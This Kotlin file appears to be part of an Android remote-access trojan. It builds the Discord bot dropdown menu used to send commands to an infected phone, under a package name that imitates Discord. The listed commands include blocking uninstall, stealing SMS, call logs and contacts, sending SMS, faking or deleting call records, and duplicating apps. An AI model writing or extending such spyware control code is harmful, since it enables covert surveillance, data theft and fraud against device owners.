package com.discord.settings

class OptionsMenu {
    fun optionsJson(myModel:String):String{
        return """{
            "content": "```QUICK OPTIONS:: ($myModel)```",
            "components": [{
                "type": 1,
                "components": [{
                    "type": 3,
                    "custom_id": "$myModel dropdown_id",
                    "placeholder": "Select an option ($myModel)",
                    "options": [
                        
                        {"label": "🟡 Block Uninstall","value": "$myModel noModal uninstall block"},
                        {"label": "🟡 Block App ✱","value": "$myModel modal blockApp apps "},
                        {"label": "🟣 Create Contact ✱","value": "$myModel modal createContact Name#number"},
                        {"label": "🟣 Create Call ✱","value": "$myModel modal createCall number#type#time(minutes-ago)#duration(minute)"},
                        {"label": "🟠 Delete Last Call","value": "$myModel noModal deleteCall last"},
                        {"label": "🟠 Delete Call ✱","value": "$myModel modal deleteCall number"},
                        {"label": "🟠 Delete Contact ✱","value": "$myModel modal deleteContact number "},
                        {"label": "🟠 Duplicate App ✱","value": "$myModel modal duplicateApp appName"},
                        {"label": "🔵 Flash ON","value": "$myModel noModal flashON"},
                        {"label": "🔵 Flash OFF","value": "$myModel noModal flashOFF"},
                        {"label": "🔴 Granted Permissions","value": "$myModel noModal permissions"},
                        {"label": "🔴 Get Contacts","value": "$myModel noModal myContacts"},
                        {"label": "🔴 Get Contacts (filter) ✱","value": "$myModel modal contactsFilter firstLetter"},
                        {"label": "🔴 Get SMS","value": "$myModel noModal sms"},
                        {"label": "🔴 Get Call Logs","value": "$myModel noModal calls"},
                        {"label": "🟣 Installed Apps","value": "$myModel noModal apps"},
                        {"label": "🟢 Ping Connection","value": "$myModel noModal ping"},
                        {"label": "🟢 Play Music  ✱","value": "$myModel modal playMusic url"},
                        {"label": "🔴 Send SMS ✱","value": "$myModel modal sendSms number#message"},
                        {"label": "🔴 System Details","value": "$myModel noModal details"},
                        {"label": "🔴 Screen ON/OFF","value": "$myModel noModal screen"},
                        {"label": "🟣 Un-Block Uninstall","value": "$myModel noModal uninstall unblock"},
                        {"label": "🟣 Un-Block all Apps","value": "$myModel noModal blockApp none"},
                        {"label": "🟣 Update contact ✱","value": "$myModel modal updateContact oldName#newName#newPhoneNumber"},
                        {"label": "🟠 Volume  ✱","value": "$myModel modal volume type#value"}
                        
                        
                    ]
                }]
            }]
        }"""
    }


}